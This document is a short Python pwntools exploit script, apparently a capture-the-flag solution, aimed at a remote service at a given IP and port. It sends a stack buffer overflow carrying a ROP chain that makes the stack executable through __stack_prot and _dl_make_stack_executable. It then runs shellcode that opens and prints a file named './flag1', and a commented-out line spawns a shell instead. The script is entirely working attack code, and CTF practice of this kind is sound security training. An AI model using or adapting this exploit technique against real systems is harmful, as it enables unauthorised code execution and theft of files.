from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'debug'

e = ELF('release/app/app')
syscall = 0x00000000004011ec
pop_rdi = 0x0000000000400686
pop_rsi = 0x0000000000410083
pop_rdx = 0x0000000000449455
pop_rax = 0x0000000000415234
mov_ptr_rsi_rax = 0x000000000047f011 # mov qword ptr [rsi], rax
jmp_rsp = 0x00000000004941fb

r = remote("34.82.101.212", 10011)
#  r = remote('localhost', 1111)
#  time.sleep(3)

code = ''
code += shellcraft.pushstr('./flag1')
code += shellcraft.open('rsp')
code += shellcraft.read('rax', 'rsp', 0x100)
code += shellcraft.write(1, 'rsp', 0x100)
#  shellcode = asm(shellcraft.sh())
shellcode = asm(code)

r.sendline(flat(
    b'a'*0x108,

    # __stack_prot = 7
    pop_rsi,
    e.sym.__stack_prot,
    pop_rax,
    7,
    mov_ptr_rsi_rax,

    # _dl_make_stack_executable(&__libc_stack_end)
    pop_rdi,
    e.sym.__libc_stack_end,
    e.sym._dl_make_stack_executable,

    # execute shellcode on stack
    jmp_rsp,

) + shellcode)

r.interactive()
